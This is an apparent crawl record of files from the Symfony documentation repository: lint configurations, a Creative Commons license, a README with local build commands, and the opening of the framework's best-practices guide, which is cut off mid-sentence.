{
  "metadata": {
    "timestamp": 1736711962368,
    "page": 414,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjQyMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "symfony/symfony-docs",
      "stars": 2207,
      "defaultBranch": "7.1",
      "files": [
        {
          "name": ".alexrc",
          "type": "blob",
          "size": 0.212890625,
          "content": "{\n  \"allow\": [\n      \"attack\",\n      \"attacks\",\n      \"bigger\",\n      \"color\",\n      \"colors\",\n      \"failure\",\n      \"hook\",\n      \"hooks\",\n      \"host-hostess\",\n      \"invalid\",\n      \"remain\",\n      \"special\"\n  ]\n}\n"
        },
        {
          "name": ".doctor-rst.yaml",
          "type": "blob",
          "size": 4.4931640625,
          "content": "rules:\n    american_english: ~\n    avoid_repetetive_words: ~\n    blank_line_after_anchor: ~\n    blank_line_after_directive: ~\n    blank_line_before_directive: ~\n    composer_dev_option_not_at_the_end: ~\n    correct_code_block_directive_based_on_the_content: ~\n    deprecated_directive_should_have_version: ~\n    ensure_bash_prompt_before_composer_command: ~\n    ensure_correct_format_for_phpfunction: ~\n    ensure_exactly_one_space_before_directive_type: ~\n    ensure_exactly_one_space_between_link_definition_and_link: ~\n    ensure_explicit_nullable_types: ~\n    ensure_github_directive_start_with_prefix:\n        prefix: 'Symfony'\n    ensure_link_bottom: ~\n    ensure_link_definition_contains_valid_url: ~\n    ensure_order_of_code_blocks_in_configuration_block: ~\n    ensure_php_reference_syntax: ~\n    extend_abstract_controller: ~\n    # extension_xlf_instead_of_xliff: ~\n    forbidden_directives:\n        directives:\n            - '.. index::'\n            - directive: '.. caution::'\n              replacements: ['.. warning::', '.. danger::']\n    indention: ~\n    lowercase_as_in_use_statements: ~\n    max_blank_lines:\n        max: 2\n    max_colons: ~\n    no_app_console: ~\n    no_attribute_redundant_parenthesis: ~\n    no_blank_line_after_filepath_in_php_code_block: ~\n    no_blank_line_after_filepath_in_twig_code_block: ~\n    no_blank_line_after_filepath_in_xml_code_block: ~\n    no_blank_line_after_filepath_in_yaml_code_block: ~\n    no_brackets_in_method_directive: ~\n    no_broken_ref_directive: ~\n    no_composer_req: ~\n    no_directive_after_shorthand: ~\n    no_duplicate_use_statements: ~\n    no_explicit_use_of_code_block_php: ~\n    no_footnotes: ~\n    no_inheritdoc: ~\n    no_merge_conflict: ~\n    no_namespace_after_use_statements: ~\n    no_php_open_tag_in_code_block_php_directive: ~\n    no_space_before_self_xml_closing_tag: ~\n    non_static_phpunit_assertions: ~\n    only_backslashes_in_namespace_in_php_code_block: ~\n    only_backslashes_in_use_statements_in_php_code_block: ~\n    ordered_use_statements: ~\n    php_prefix_before_bin_console: ~\n    remove_trailing_whitespace: ~\n    replace_code_block_types: ~\n    replacement: ~\n    short_array_syntax: ~\n    space_between_label_and_link_in_doc: ~\n    space_between_label_and_link_in_ref: ~\n    string_replacement: ~\n    title_underline_length_must_match_title_length: ~\n    typo: ~\n    unused_links: ~\n    use_deprecated_directive_instead_of_versionadded: ~\n    use_named_constructor_without_new_keyword_rule: ~\n    use_https_xsd_urls: ~\n    valid_inline_highlighted_namespaces: ~\n    valid_use_statements: ~\n    versionadded_directive_should_have_version: ~\n    yaml_instead_of_yml_suffix: ~\n\n    #   master\n    versionadded_directive_major_version:\n        major_version: 7\n\n    versionadded_directive_min_version:\n        min_version: '7.0'\n\n    deprecated_directive_major_version:\n        major_version: 7\n\n    deprecated_directive_min_version:\n        min_version: '7.0'\n\nexclude_rule_for_file:\n    - path: configuration/multiple_kernels.rst\n      rule_name: replacement\n    - path: page_creation.rst\n      rule_name: no_php_open_tag_in_code_block_php_directive\n    - path: frontend/create_ux_bundle.rst\n      rule_name: argument_variable_must_match_type\n\n# do not report as violation\nwhitelist:\n    regex:\n        - '/``.yml``/'\n        - '/(.*)\\.orm\\.yml/' # currently DoctrineBundle only supports .yml\n    lines:\n        - 'in config files, so the old ``app/config/config_dev.yml`` goes to'\n        - '#. The most important config file is ``app/config/services.yml``, which now is'\n        - 'The bin/console Command'\n        - '.. _`LDAP injection`: http://projects.webappsec.org/w/page/13246947/LDAP%20Injection'\n        - '.. versionadded:: 2.8.0' # Doctrine\n        - '.. versionadded:: 1.9.0' # Encore\n        - '.. versionadded:: 1.18' # Flex in setup/upgrade_minor.rst\n        - '.. versionadded:: 1.0.0' # Encore\n        - '.. versionadded:: 2.7.1' # Doctrine\n        - '123,' # assertion for var_dumper - components/var_dumper.rst\n        - '\"foo\",' # assertion for var_dumper - components/var_dumper.rst\n        - '$var .= \"Because of this `\\xE9` octet (\\\\xE9),\\n\";'\n        - '.. versionadded:: 0.2' # MercureBundle\n        - '.. versionadded:: 3.6' # MonologBundle\n        - '.. versionadded:: 3.8' # MonologBundle\n        - '.. versionadded:: 3.5' # Monolog\n        - '.. versionadded:: 3.0' # Doctrine ORM\n        - '.. _`a feature to test applications using Mercure`: https://github.com/symfony/panther#creating-isolated-browsers-to-test-apps-using-mercure-or-websocket'\n        - 'End to End Tests (E2E)'\n"
        },
        {
          "name": ".editorconfig",
          "type": "blob",
          "size": 0.126953125,
          "content": "root = true\n\n[*]\nindent_style = space\nindent_size = 4\ncharset = utf-8\ntrim_trailing_whitespace = true\ninsert_final_newline = true\n"
        },
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.029296875,
          "content": "/_build/vendor\n/_build/output\n"
        },
        {
          "name": "LICENSE.md",
          "type": "blob",
          "size": 19.470703125,
          "content": "LICENSE\n=======\n\n**Creative Commons Attribution-ShareAlike 3.0 Unported**\nhttps://creativecommons.org/licenses/by-sa/3.0/\n\n-----\n\nTHE WORK (AS DEFINED BELOW) IS PROVIDED UNDER THE TERMS OF THIS CREATIVE COMMONS\nPUBLIC LICENSE (\"CCPL\" OR \"LICENSE\"). THE WORK IS PROTECTED BY COPYRIGHT AND/OR\nOTHER APPLICABLE LAW. ANY USE OF THE WORK OTHER THAN AS AUTHORIZED UNDER THIS\nLICENSE OR COPYRIGHT LAW IS PROHIBITED.\n\nBY EXERCISING ANY RIGHTS TO THE WORK PROVIDED HERE, YOU ACCEPT AND AGREE TO BE\nBOUND BY THE TERMS OF THIS LICENSE. TO THE EXTENT THIS LICENSE MAY BE CONSIDERED\nTO BE A CONTRACT, THE LICENSOR GRANTS YOU THE RIGHTS CONTAINED HERE IN\nCONSIDERATION OF YOUR ACCEPTANCE OF SUCH TERMS AND CONDITIONS.\n\n1. Definitions\n--------------\n\na. **\"Adaptation\"** means a work based upon the Work, or upon the Work and other\npre-existing works, such as a translation, adaptation, derivative work,\narrangement of music or other alterations of a literary or artistic work, or\nphonogram or performance and includes cinematographic adaptations or any other\nform in which the Work may be recast, transformed, or adapted including in any\nform recognizably derived from the original, except that a work that constitutes\na Collection will not be considered an Adaptation for the purpose of this\nLicense. For the avoidance of doubt, where the Work is a musical work,\nperformance or phonogram, the synchronization of the Work in timed-relation with\na moving image (\"synching\") will be considered an Adaptation for the purpose of\nthis License.\n\nb. **\"Collection\"** means a collection of literary or artistic works, such as\nencyclopedias and anthologies, or performances, phonograms or broadcasts, or\nother works or subject matter other than works listed in Section 1(f) below,\nwhich, by reason of the selection and arrangement of their contents, constitute\nintellectual creations, in which the Work is included in its entirety in\nunmodified form along with one or more other contributions, each constituting\nseparate and independent works in themselves, which together are assembled into\na collective whole. A work that constitutes a Collection will not be considered\nan Adaptation (as defined below) for the purposes of this License.\n\nc. **\"Creative Commons Compatible License\"** means a license that is listed at\nhttps://creativecommons.org/compatiblelicenses that has been approved by\nCreative Commons as being essentially equivalent to this License, including, at\na minimum, because that license: (i) contains terms that have the same purpose,\nmeaning and effect as the License Elements of this License; and, (ii) explicitly\npermits the relicensing of adaptations of works made available under that\nlicense under this License or a Creative Commons jurisdiction license with the\nsame License Elements as this License.\n\nd. **\"Distribute\"** means to make available to the public the original and\ncopies of the Work or Adaptation, as appropriate, through sale or other transfer\nof ownership.\n\ne. **\"License Elements\"** means the following high-level license attributes as\nselected by Licensor and indicated in the title of this License: Attribution,\nShareAlike.\n\nf. **\"Licensor\"** means the individual, individuals, entity or entities that\noffer(s) the Work under the terms of this License.\n\ng. **\"Original Author\"\"** means, in the case of a literary or artistic work, the\nindividual, individuals, entity or entities who created the Work or if no\nindividual or entity can be identified, the publisher; and in addition (i) in\nthe case of a performance the actors, singers, musicians, dancers, and other\npersons who act, sing, deliver, declaim, play in, interpret or otherwise perform\nliterary or artistic works or expressions of folklore; (ii) in the case of a\nphonogram the producer being the person or legal entity who first fixes the\nsounds of a performance or other sounds; and, (iii) in the case of broadcasts,\nthe organization that transmits the broadcast.\n\nh. **\"Work\"** means the literary and/or artistic work offered under the terms of\nthis License including without limitation any production in the literary,\nscientific and artistic domain, whatever may be the mode or form of its\nexpression including digital form, such as a book, pamphlet and other writing; a\nlecture, address, sermon or other work of the same nature; a dramatic or\ndramatico-musical work; a choreographic work or entertainment in dumb show; a\nmusical composition with or without words; a cinematographic work to which are\nassimilated works expressed by a process analogous to cinematography; a work of\ndrawing, painting, architecture, sculpture, engraving or lithography; a\nphotographic work to which are assimilated works expressed by a process\nanalogous to photography; a work of applied art; an illustration, map, plan,\nsketch or three-dimensional work relative to geography, topography, architecture\nor science; a performance; a broadcast; a phonogram; a compilation of data to\nthe extent it is protected as a copyrightable work; or a work performed by a\nvariety or circus performer to the extent it is not otherwise considered a\nliterary or artistic work.\n\ni. **\"You\"** means an individual or entity exercising rights under this License\nwho has not previously violated the terms of this License with respect to the\nWork, or who has received express permission from the Licensor to exercise\nrights under this License despite a previous violation.\n\nj. **\"Publicly Perform\"** means to perform public recitations of the Work and to\ncommunicate to the public those public recitations, by any means or process,\nincluding by wire or wireless means or public digital performances; to make\navailable to the public Works in such a way that members of the public may\naccess these Works from a place and at a place individually chosen by them; to\nperform the Work to the public by any means or process and the communication to\nthe public of the performances of the Work, including by public digital\nperformance; to broadcast and rebroadcast the Work by any means including signs,\nsounds or images.\n\nk. **\"Reproduce\"** means to make copies of the Work by any means including\nwithout limitation by sound or visual recordings and the right of fixation and\nreproducing fixations of the Work, including storage of a protected performance\nor phonogram in digital form or other electronic medium.\n\n2. Fair Dealing Rights\n----------------------\n\nNothing in this License is intended to reduce, limit, or restrict any uses free\nfrom copyright or rights arising from limitations or exceptions that are\nprovided for in connection with the copyright protection under copyright law or\nother applicable laws.\n\n3. License Grant\n----------------\n\nSubject to the terms and conditions of this License, Licensor hereby grants You\na worldwide, royalty-free, non-exclusive, perpetual (for the duration of the\napplicable copyright) license to exercise the rights in the Work as stated\nbelow:\n\na. to Reproduce the Work, to incorporate the Work into one or more Collections,\nand to Reproduce the Work as incorporated in the Collections;\n\nb. to create and Reproduce Adaptations provided that any such Adaptation,\nincluding any translation in any medium, takes reasonable steps to clearly\nlabel, demarcate or otherwise identify that changes were made to the original\nWork. For example, a translation could be marked \"The original work was\ntranslated from English to Spanish,\" or a modification could indicate \"The\noriginal work has been modified.\";\n\nc. to Distribute and Publicly Perform the Work including as incorporated in\nCollections; and,\n\nd. to Distribute and Publicly Perform Adaptations.\n\ne. For the avoidance of doubt:\n\n   1. **Non-waivable Compulsory License Schemes.** In those jurisdictions in\n      which the right to collect royalties through any statutory or compulsory\n      licensing scheme cannot be waived, the Licensor reserves the exclusive\n      right to collect such royalties for any exercise by You of the rights\n      granted under this License;\n\n   2. **Waivable Compulsory License Schemes.** In those jurisdictions in which\n      the right to collect royalties through any statutory or compulsory\n      licensing scheme can be waived, the Licensor waives the exclusive right to\n      collect such royalties for any exercise by You of the rights granted under\n      this License; and,\n\n   3. **Voluntary License Schemes.** The Licensor waives the right to collect\n      royalties, whether individually or, in the event that the Licensor is a\n      member of a collecting society that administers voluntary licensing\n      schemes, via that society, from any exercise by You of the rights granted\n      under this License.\n\nThe above rights may be exercised in all media and formats whether now known or\nhereafter devised. The above rights include the right to make such modifications\nas are technically necessary to exercise the rights in other media and formats.\nSubject to Section 8(f), all rights not expressly granted by Licensor are hereby\nreserved.\n\n4. Restrictions\n---------------\n\nThe license granted in Section 3 above is expressly made subject to and limited\nby the following restrictions:\n\na. You may Distribute or Publicly Perform the Work only under the terms of this\nLicense. You must include a copy of, or the Uniform Resource Identifier (URI)\nfor, this License with every copy of the Work You Distribute or Publicly\nPerform. You may not offer or impose any terms on the Work that restrict the\nterms of this License or the ability of the recipient of the Work to exercise\nthe rights granted to that recipient under the terms of the License. You may not\nsublicense the Work. You must keep intact all notices that refer to this License\nand to the disclaimer of warranties with every copy of the Work You Distribute\nor Publicly Perform. When You Distribute or Publicly Perform the Work, You may\nnot impose any effective technological measures on the Work that restrict the\nability of a recipient of the Work from You to exercise the rights granted to\nthat recipient under the terms of the License. This Section 4(a) applies to the\nWork as incorporated in a Collection, but this does not require the Collection\napart from the Work itself to be made subject to the terms of this License. If\nYou create a Collection, upon notice from any Licensor You must, to the extent\npracticable, remove from the Collection any credit as required by Section 4(c),\nas requested. If You create an Adaptation, upon notice from any Licensor You\nmust, to the extent practicable, remove from the Adaptation any credit as\nrequired by Section 4(c), as requested.\n\nb. You may Distribute or Publicly Perform an Adaptation only under the terms of:\n(i) this License; (ii) a later version of this License with the same License\nElements as this License; (iii) a Creative Commons jurisdiction license (either\nthis or a later license version) that contains the same License Elements as this\nLicense (e.g. Attribution-ShareAlike 3.0 US)); (iv) a Creative Commons\nCompatible License. If you license the Adaptation under one of the licenses\nmentioned in (iv), you must comply with the terms of that license. If you\nlicense the Adaptation under the terms of any of the licenses mentioned in (i),\n(ii) or (iii) (the \"Applicable License\"), you must comply with the terms of the\nApplicable License generally and the following provisions: (I) You must include\na copy of, or the URI for, the Applicable License with every copy of each\nAdaptation You Distribute or Publicly Perform; (II) You may not offer or impose\nany terms on the Adaptation that restrict the terms of the Applicable License or\nthe ability of the recipient of the Adaptation to exercise the rights granted to\nthat recipient under the terms of the Applicable License; (III) You must keep\nintact all notices that refer to the Applicable License and to the disclaimer of\nwarranties with every copy of the Work as included in the Adaptation You\nDistribute or Publicly Perform; (IV) when You Distribute or Publicly Perform the\nAdaptation, You may not impose any effective technological measures on the\nAdaptation that restrict the ability of a recipient of the Adaptation from You\nto exercise the rights granted to that recipient under the terms of the\nApplicable License. This Section 4(b) applies to the Adaptation as incorporated\nin a Collection, but this does not require the Collection apart from the\nAdaptation itself to be made subject to the terms of the Applicable License.\n\nc. If You Distribute, or Publicly Perform the Work or any Adaptations or\nCollections, You must, unless a request has been made pursuant to Section 4(a),\nkeep intact all copyright notices for the Work and provide, reasonable to the\nmedium or means You are utilizing: (i) the name of the Original Author (or\npseudonym, if applicable) if supplied, and/or if the Original Author and/or\nLicensor designate another party or parties (e.g. a sponsor institute,\npublishing entity, journal) for attribution (\"Attribution Parties\") in\nLicensor's copyright notice, terms of service or by other reasonable means, the\nname of such party or parties; (ii) the title of the Work if supplied; (iii) to\nthe extent reasonably practicable, the URI, if any, that Licensor specifies to\nbe associated with the Work, unless such URI does not refer to the copyright\nnotice or licensing information for the Work; and (iv) , consistent with Section\n3(b), in the case of an Adaptation, a credit identifying the use of the Work in\nthe Adaptation (e.g. \"French translation of the Work by Original Author,\" or\n\"Screenplay based on original Work by Original Author\"). The credit required by\nthis Section 4(c) may be implemented in any reasonable manner; provided,\nhowever, that in the case of a Adaptation or Collection, at a minimum such\ncredit will appear, if a credit for all contributing authors of the Adaptation\nor Collection appears, then as part of these credits and in a manner at least as\nprominent as the credits for the other contributing authors. For the avoidance\nof doubt, You may only use the credit required by this Section for the purpose\nof attribution in the manner set out above and, by exercising Your rights under\nthis License, You may not implicitly or explicitly assert or imply any\nconnection with, sponsorship or endorsement by the Original Author, Licensor\nand/or Attribution Parties, as appropriate, of You or Your use of the Work,\nwithout the separate, express prior written permission of the Original Author,\nLicensor and/or Attribution Parties.\n\nd. Except as otherwise agreed in writing by the Licensor or as may be otherwise\npermitted by applicable law, if You Reproduce, Distribute or Publicly Perform\nthe Work either by itself or as part of any Adaptations or Collections, You must\nnot distort, mutilate, modify or take other derogatory action in relation to the\nWork which would be prejudicial to the Original Author's honor or reputation.\nLicensor agrees that in those jurisdictions (e.g. Japan), in which any exercise\nof the right granted in Section 3(b) of this License (the right to make\nAdaptations) would be deemed to be a distortion, mutilation, modification or\nother derogatory action prejudicial to the Original Author's honor and\nreputation, the Licensor will waive or not assert, as appropriate, this Section,\nto the fullest extent permitted by the applicable national law, to enable You to\nreasonably exercise Your right under Section 3(b) of this License (right to make\nAdaptations) but not otherwise.\n\n5. Representations, Warranties and Disclaimer\n---------------------------------------------\n\nUNLESS OTHERWISE MUTUALLY AGREED TO BY THE PARTIES IN WRITING, LICENSOR OFFERS\nTHE WORK AS-IS AND MAKES NO REPRESENTATIONS OR WARRANTIES OF ANY KIND CONCERNING\nTHE WORK, EXPRESS, IMPLIED, STATUTORY OR OTHERWISE, INCLUDING, WITHOUT\nLIMITATION, WARRANTIES OF TITLE, MERCHANTIBILITY, FITNESS FOR A PARTICULAR\nPURPOSE, NONINFRINGEMENT, OR THE ABSENCE OF LATENT OR OTHER DEFECTS, ACCURACY,\nOR THE PRESENCE OF ABSENCE OF ERRORS, WHETHER OR NOT DISCOVERABLE. SOME\nJURISDICTIONS DO NOT ALLOW THE EXCLUSION OF IMPLIED WARRANTIES, SO SUCH\nEXCLUSION MAY NOT APPLY TO YOU.\n\n6. Limitation on Liability\n--------------------------\n\nEXCEPT TO THE EXTENT REQUIRED BY APPLICABLE LAW, IN NO EVENT WILL LICENSOR BE\nLIABLE TO YOU ON ANY LEGAL THEORY FOR ANY SPECIAL, INCIDENTAL, CONSEQUENTIAL,\nPUNITIVE OR EXEMPLARY DAMAGES ARISING OUT OF THIS LICENSE OR THE USE OF THE\nWORK, EVEN IF LICENSOR HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.\n\n7. Termination\n--------------\n\na. This License and the rights granted hereunder will terminate automatically\nupon any breach by You of the terms of this License. Individuals or entities who\nhave received Adaptations or Collections from You under this License, however,\nwill not have their licenses terminated provided such individuals or entities\nremain in full compliance with those licenses. Sections 1, 2, 5, 6, 7, and 8\nwill survive any termination of this License.\n\nb. Subject to the above terms and conditions, the license granted here is\nperpetual (for the duration of the applicable copyright in the Work).\nNotwithstanding the above, Licensor reserves the right to release the Work under\ndifferent license terms or to stop distributing the Work at any time; provided,\nhowever that any such election will not serve to withdraw this License (or any\nother license that has been, or is required to be, granted under the terms of\nthis License), and this License will continue in full force and effect unless\nterminated as stated above.\n\n8. Miscellaneous\n----------------\n\na. Each time You Distribute or Publicly Perform the Work or a Collection, the\nLicensor offers to the recipient a license to the Work on the same terms and\nconditions as the license granted to You under this License.\n\nb. Each time You Distribute or Publicly Perform an Adaptation, Licensor offers\nto the recipient a license to the original Work on the same terms and conditions\nas the license granted to You under this License.\n\nc. If any provision of this License is invalid or unenforceable under applicable\nlaw, it shall not affect the validity or enforceability of the remainder of the\nterms of this License, and without further action by the parties to this\nagreement, such provision shall be reformed to the minimum extent necessary to\nmake such provision valid and enforceable.\n\nd. No term or provision of this License shall be deemed waived and no breach\nconsented to unless such waiver or consent shall be in writing and signed by the\nparty to be charged with such waiver or consent.\n\ne. This License constitutes the entire agreement between the parties with\nrespect to the Work licensed here. There are no understandings, agreements or\nrepresentations with respect to the Work not specified here. Licensor shall not\nbe bound by any additional provisions that may appear in any communication from\nYou. This License may not be modified without the mutual written agreement of\nthe Licensor and You.\n\nf. The rights granted under, and the subject matter referenced, in this License\nwere drafted utilizing the terminology of the Berne Convention for the\nProtection of Literary and Artistic Works (as amended on September 28, 1979),\nthe Rome Convention of 1961, the WIPO Copyright Treaty of 1996, the WIPO\nPerformances and Phonograms Treaty of 1996 and the Universal Copyright\nConvention (as revised on July 24, 1971). These rights and subject matter take\neffect in the relevant jurisdiction in which the License terms are sought to be\nenforced according to the corresponding provisions of the implementation of\nthose treaty provisions in the applicable national law. If the standard suite of\nrights granted under applicable copyright law includes additional rights not\ngranted under this License, such additional rights are deemed to be included in\nthe License; this License is not intended to restrict the license of any rights\nunder applicable law.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 1.3466796875,
          "content": "<p align=\"center\"><a href=\"https://symfony.com\" target=\"_blank\">\n  <img src=\"https://symfony.com/logos/symfony_black_02.svg\">\n</a></p>\n\n<h3 align=\"center\">\n  The official Symfony Documentation\n</h3>\n\n<p align=\"center\">\n  <a href=\"https://symfony.com/doc/current/index.html\">\n    Online version\n  </a>\n  <span> | </span>\n  <a href=\"https://symfony.com/components\">\n    Components\n  </a>\n  <span> | </span>\n  <a href=\"https://symfonycasts.com\">\n    Screencasts\n  </a>\n</p>\n\nContributing\n------------\n\nWe love contributors! For more information on how you can contribute, please read\nthe [Symfony Docs Contributing Guide](https://symfony.com/doc/current/contributing/documentation/overview.html).\n\n> [!IMPORTANT]\n> Use `5.4` branch as the base of your pull requests, unless you are documenting a\n> feature that was introduced *after* Symfony 5.4 (e.g. in Symfony 7.1).\n\nBuild Documentation Locally\n---------------------------\n\nThis is not needed for contributing, but it's useful if you would like to debug some\nissue in the docs or if you want to read Symfony Documentation offline.\n\n```bash\n$ git clone git@github.com:symfony/symfony-docs.git\n\n$ cd symfony-docs/\n$ cd _build/\n\n$ composer install\n\n$ php build.php\n```\n\nAfter generating docs, serve them with the internal PHP server:\n\n```bash\n$ php -S localhost:8000 -t output/\n```\n\nBrowse `http://localhost:8000` to read the docs.\n"
        },
        {
          "name": "_build",
          "type": "tree",
          "content": null
        },
        {
          "name": "_images",
          "type": "tree",
          "content": null
        },
        {
          "name": "_includes",
          "type": "tree",
          "content": null
        },
        {
          "name": "best_practices.rst",
          "type": "blob",
          "size": 17.693359375,
          "content": "The Symfony Framework Best Practices\n====================================\n\nThis article describes the **best practices for developing web applications with\nSymfony** that fit the philosophy envisioned by the original Symfony creators.\n\nIf you don't agree with some of these recommendations, they might be a good\n**starting point** that you can then **extend and fit to your specific needs**.\nYou can even ignore them completely and continue using your own best practices\nand methodologies. Symfony is flexible enough to adapt to your needs.\n\nThis article assumes that you already have experience developing Symfony\napplications. If you don't, read first the :doc:`Getting Started </setup>`\nsection of the documentation.\n\n.. tip::\n\n    Symfony provides a sample application called `Symfony Demo`_ that follows\n    all these best practices, so you can experience them in practice.\n\nCreating the Project\n--------------------\n\nUse the Symfony Binary to Create Symfony Applications\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe Symfony binary is an executable command created in your machine when you\n`download Symfony`_. It provides multiple utilities, including the simplest way\nto create new Symfony applications:\n\n.. code-block:: terminal\n\n    $ symfony new my_project_directory\n\nUnder the hood, this Symfony binary command executes the needed `Composer`_\ncommand to :ref:`create a new Symfony application <creating-symfony-applications>`\nbased on the current stable version.\n\nUse the Default Directory Structure\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nUnless your project follows a development practice that imposes a certain\ndirectory structure, follow the default Symfony directory structure. It's flat,\nself-explanatory and not coupled to Symfony:\n\n.. code-block:: text\n\n    your_project/\n    ├─ assets/\n    ├─ bin/\n    │  └─ console\n    ├─ config/\n    │  ├─ packages/\n    │  ├─ routes/\n    │  └─ services.yaml\n    ├─ migrations/\n    ├─ public/\n    │  ├─ build/\n    │  └─ index.php\n    ├─ src/\n    │  ├─ Kernel.php\n    │  ├─ Command/\n    │  ├─ Controller/\n    │  ├─ DataFixtures/\n    │  ├─ Entity/\n    │  ├─ EventSubscriber/\n    │  ├─ Form/\n    │  ├─ Repository/\n    │  ├─ Security/\n    │  └─ Twig/\n    ├─ templates/\n    ├─ tests/\n    ├─ translations/\n    ├─ var/\n    │  ├─ cache/\n    │  └─ log/\n    └─ vendor/\n\nConfiguration\n-------------\n\nUse Environment Variables for Infrastructure Configuration\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe values of these options change from one machine to another (e.g. from your\ndevelopment machine to the production server), but they don't modify the\napplication behavior.\n\n:ref:`Use env vars in your project <config-env-vars>` to define these options\nand create multiple ``.env`` files to :ref:`configure env vars per environment <config-dot-env>`.\n\n.. _use-secret-for-sensitive-information:\n\nUse Secrets for Sensitive Information\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen your application has sensitive configuration, like an API key, you should\nstore those securely via :doc:`Symfony’s secrets management system </configuration/secrets>`.\n\nUse Parameters for Application Configuration\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThese are the options used to modify the application behavior, such as the sender\nof email notifications, or the enabled `feature toggles`_. Their value doesn't\nchange per machine, so don't define them as environment variables.\n\nDefine these options as :ref:`parameters <configuration-parameters>` in the\n``config/services.yaml`` file. You can override these options per\n:ref:`environment <configuration-environments>` in the ``config/services_dev.yaml``\nand ``config/services_prod.yaml`` files.\n\nUnless the application configuration is reused multiple times and needs\nrigid validation, do *not* use the :doc:`Config component </components/config>`\nto define the options.\n\nUse Short and Prefixed Parameter Names\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nConsider using ``app.`` as the prefix of your :ref:`parameters <configuration-parameters>`\nto avoid collisions with Symfony and third-party bundles/libraries parameters.\nThen, use just one or two words to describe the purpose of the parameter:\n\n.. code-block:: yaml\n\n    # config/services.yaml\n    parameters:\n        # don't do this: 'dir' is too generic, and it doesn't convey any meaning\n        app.dir: '...'\n        # do this: short but easy to understand names\n        app.contents_dir: '...'\n        # it's OK to use dots, underscores, dashes or nothing, but always\n        # be consistent and use the same format for all the parameters\n        app.dir.contents: '...'\n        app.contents-dir: '...'\n\nUse Constants to Define Options that Rarely Change\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nConfiguration options like the number of items to display in some listing rarely\nchange. Instead of defining them as :ref:`configuration parameters <configuration-parameters>`,\ndefine them as PHP constants in the related classes. Example::\n\n    // src/Entity/Post.php\n    namespace App\\Entity;\n\n    class Post\n    {\n        public const NUMBER_OF_ITEMS = 10;\n\n        // ...\n    }\n\nThe main advantage of constants is that you can use them everywhere, including\nTwig templates and Doctrine entities, whereas parameters are only available\nfrom places with access to the :doc:`service container </service_container>`.\n\nThe only notable disadvantage of using constants for this kind of configuration\nvalues is that it's complicated to redefine their values in your tests.\n\nBusiness Logic\n--------------\n\n.. _best-practice-no-application-bundles:\n\nDon't Create any Bundle to Organize your Application Logic\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen Symfony 2.0 was released, applications used :doc:`bundles </bundles>` to\ndivide their code into logical features: UserBundle, ProductBundle,\nInvoiceBundle, etc. However, a bundle is meant to be something that can be\nreused as a stand-alone piece of software.\n\nIf you need to reuse some feature in your projects, create a bundle for it (in a\nprivate repository, do not make it publicly available). For the rest of your\napplication code, use PHP namespaces to organize code instead of bundles.\n\nUse Autowiring to Automate the Configuration of Application Services\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n:doc:`Service autowiring </service_container/autowiring>` is a feature that\nreads the type-hints on your constructor (or other methods) and automatically\npasses the correct services to each method, making it unnecessary to configure\nservices explicitly and simplifying the application maintenance.\n\nUse it in combination with :ref:`service autoconfiguration <services-autoconfigure>`\nto also add :doc:`service tags </service_container/tags>` to the services\nneeding them, such as Twig extensions, event subscribers, etc.\n\nServices Should be Private Whenever Possible\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n:ref:`Make services private <container-public>` to prevent you from accessing\nthose services via ``$container->get()``. Instead, you will need to use proper\ndependency injection.\n\nUse the YAML Format to Configure your own Services\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you use the :ref:`default services.yaml configuration <service-container-services-load-example>`,\nmost services will be configured automatically. However, in some edge cases\nyou'll need to configure services (or parts of them) manually.\n\nYAML is the format recommended configuring services because it's friendly to\nnewcomers and concise, but Symfony also supports XML and PHP configuration.\n\nUse Attributes to Define the Doctrine Entity Mapping\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nDoctrine entities are plain PHP objects that you store in some \"database\".\nDoctrine only knows about your entities through the mapping metadata configured\nfor your model classes.\n\nDoctrine supports several metadata formats, but it's recommended to use PHP\nattributes because they are by far the most convenient and agile way of setting\nup and looking for mapping information.\n\nControllers\n-----------\n\nMake your Controller Extend the ``AbstractController`` Base Controller\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony provides a :ref:`base controller <the-base-controller-classes-services>`\nwhich includes shortcuts for the most common needs such as rendering templates\nor checking security permissions.\n\nExtending your controllers from this base controller couples your application\nto Symfony. Coupling is generally wrong, but it may be OK in this case because\ncontrollers shouldn't contain any business logic. Controllers should contain\nnothing more than a few lines of *glue-code*, so you are not coupling the\nimportant parts of your application.\n\n.. _best-practice-controller-annotations:\n.. _best-practice-controller-attributes:\n\nUse Attributes to Configure Routing, Caching, and Security\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nUsing attributes for routing, caching, and security simplifies\nconfiguration. You don't need to browse several files created with different\nformats (YAML, XML, PHP): all the configuration is just where you  require it,\nand it only uses one format.\n\nUse Dependency Injection to Get Services\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you extend the base ``AbstractController``, you can 